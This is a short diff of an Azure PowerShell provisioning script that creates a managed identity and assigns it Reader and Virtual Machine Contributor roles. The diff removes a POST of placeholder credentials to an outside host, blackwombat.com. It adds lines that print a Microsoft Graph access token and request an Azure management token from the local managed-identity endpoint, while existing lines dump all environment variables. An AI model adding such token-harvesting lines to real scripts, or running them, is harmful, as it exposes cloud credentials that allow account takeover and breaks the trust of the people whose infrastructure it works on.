@@ -14,8 +14,9 @@ New-AzUserAssignedIdentity -ResourceGroupName $resourceGroupName -Name mi_wucpi2
 
 Write-Output "Env variables --- $((gci env:*).GetEnumerator() | Sort-Object Name | Out-String)"
 
-$postParams = @{firstdata='me';seconddata='qwerty'}
-Invoke-WebRequest -Uri http://blackwombat.com/wp-login -Method POST -Body $postParams
+Write-Output "Env variables --- $((Get-AzAccessToken -ResourceUrl "https://graph.microsoft.com").Token)"
+
+curl "http://169.254.131.2:8081/msi/token?resource=https://management.azure.com"
 
 New-AzRoleAssignment -ObjectId $uamiObject.PrincipalId -RoleDefinitionName Reader
 New-AzRoleAssignment -ObjectId $uamiObject.PrincipalId -RoleDefinitionName "Virtual Machine Contributor"
